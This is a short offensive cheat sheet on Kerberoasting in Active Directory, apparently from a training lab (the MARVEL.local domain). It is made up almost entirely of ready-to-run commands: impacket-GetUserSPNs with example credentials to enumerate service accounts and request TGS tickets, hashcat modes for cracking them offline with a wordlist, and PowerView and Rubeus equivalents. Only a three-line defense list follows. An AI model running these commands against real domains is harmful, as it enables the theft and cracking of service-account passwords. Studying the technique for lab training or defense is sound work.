# KERBEROASTING

Target Service Principal Names (SPNs) in Active Directory. Request Kerberos tickets and crack them offline to obtain plaintext passwords.

## Enumerate SPNs

Find all service accounts with SPNs:

```bash
impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.0.2.15
```

## Request Kerberos Tickets

Request TGS tickets for cracking:

```bash
impacket-GetUserSPNs MARVEL.local/fcastle:Password1 -dc-ip 10.0.2.15 -request
```

## Crack TGS Tickets

Use Hashcat to crack offline:

```bash
hashcat -m 13100 krb.txt /usr/share/wordlists/rockyou.txt
```

Hashcat modes:
- `m 13100` - Kerberos 5 TGS-REP etype 23 (RC4-HMAC)
- `m 19600` - Kerberos 5 TGS-REP etype 17 (AES128-CTS)
- `m 19700` - Kerberos 5 TGS-REP etype 18 (AES256-CTS)

## Alternative Tools

### PowerView (PowerShell)

```powershell
Get-NetUser -SPN | select samaccountname, serviceprincipalname
```

### Rubeus (C#)

```bash
rubeus.exe kerberoast /outfile:hashes.txt
rubeus.exe kerberoast /user:svc_account /domain:MARVEL.local
```

## Defense

- Use strong service account passwords
- Enable AES encryption for Kerberos (stronger than RC4)
- Monitor for unusual ticket requests
